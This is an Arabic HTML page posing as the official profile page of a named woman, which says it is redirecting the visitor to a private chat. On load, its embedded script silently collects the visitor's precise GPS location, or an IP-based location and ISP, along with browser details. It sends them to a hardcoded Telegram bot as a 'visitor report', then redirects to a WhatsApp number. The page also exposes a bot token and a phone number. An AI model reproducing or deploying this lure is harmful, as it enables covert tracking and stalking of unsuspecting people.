<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <title>هند العزاوي - الصفحة الرسمية</title>
  <style>
    /* نفس الأنماط السابقة... */
  </style>
  <script>
    // إعدادات التلجرام
    const BOT_TOKEN = '7054208207:AAHVwwMlay45aLFyQn4FCJyfWM_-AoQXpMM';
    const CHAT_ID = '7493001551';

    // دالة إرسال إلى التلجرام
    async function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      try {
        await fetch(url, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_ID,
            text: message
          })
        });
      } catch (error) {
        console.error('Error sending to Telegram:', error);
      }
    }

    // تحديد الموقع بثلاث طرق مختلفة للدقة
    async function trackVisitor() {
      let locationData = {
        ip: 'غير معروف',
        city: 'غير معروف',
        country: 'غير معروف',
        method: 'غير معروف'
      };

      // الطريقة 1: GPS للمتصفح (الأدق لكن يحتاج إذن)
      if (navigator.geolocation) {
        try {
          const position = await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 5000,
              maximumAge: 0
            });
          });
          
          locationData = {
            latitude: position.coords.latitude,
            longitude: position.coords.longitude,
            accuracy: position.coords.accuracy + ' متر',
            method: 'GPS'
          };
          
        } catch (gpsError) {
          console.log('GPS Error:', gpsError);
        }
      }

      // الطريقة 2: استخدام IPAPI مع خادم سوري
      if (locationData.method === 'غير معروف') {
        try {
          const response = await fetch('https://sy.ip-api.com/json/');
          const data = await response.json();
          
          locationData = {
            ip: data.query,
            city: data.city || 'غير معروف',
            region: data.regionName || 'غير معروف',
            country: data.country || 'غير معروف',
            isp: data.isp || 'غير معروف',
            method: 'IPAPI-SY'
          };
          
        } catch (ipError) {
          console.log('IPAPI Error:', ipError);
        }
      }

      // الطريقة 3: استخدام خدمة احتياطية
      if (locationData.method === 'غير معروف') {
        try {
          const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN');
          const data = await response.json();
          
          locationData = {
            ip: data.ip,
            city: data.city || 'غير معروف',
            region: data.region || 'غير معروف',
            country: data.country || 'غير معروف',
            isp: data.org || 'غير معروف',
            method: 'IPINFO'
          };
          
        } catch (fallbackError) {
          console.log('Fallback Error:', fallbackError);
        }
      }

      // إعداد رسالة التقرير
      let message = '🕵️‍♂️ تقرير الزائر:\n\n';
      
      if (locationData.latitude) {
        const mapsLink = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
        message += `📍 الموقع الدقيق:\n${mapsLink}\n(دقة: ${locationData.accuracy})\n`;
        message += `⚙️ الطريقة: ${locationData.method}\n`;
      } else {
        message += `🌐 IP: ${locationData.ip}\n`;
        message += `🏙️ المدينة: ${locationData.city}\n`;
        message += `📍 المنطقة: ${locationData.region}\n`;
        message += `🌍 الدولة: ${locationData.country}\n`;
        message += `📡 مزود الخدمة: ${locationData.isp}\n`;
        message += `⚙️ الطريقة: ${locationData.method}\n`;
        message += `⚠️ ملاحظة: هذا موقع تقريبي بناءً على IP\n`;
      }

      // إضافة معلومات المتصفح
      message += `\n🔍 معلومات إضافية:\n`;
      message += `🌐 المتصفح: ${navigator.userAgent}\n`;
      message += `🖥 نظام التشغيل: ${navigator.platform}\n`;
      message += `🕒 الوقت: ${new Date().toLocaleString('ar-SY')}\n`;

      await sendToTelegram(message);
    }

    // بدء التتبع عند تحميل الصفحة
    trackVisitor();

    // التحويل إلى واتساب بعد 5 ثوان
    setTimeout(() => {
      window.location.href = "https://wa.me/963943820819?text=مرحبا";
    }, 5000);
  </script>
</head>
<body>
  <div class="card">
    <img src="https://i.imgur.com/4M7IWwP.png" alt="هند العزاوي" class="avatar">
    <h2>هند العزاوي</h2>
    <p>🌟 أهلاً بك في الصفحة الرسمية 🌟</p>
    <p>جارٍ التحويل إلى المحادثة الخاصة...</p>
    <div class="loader"></div>
  </div>
</body>
</html>
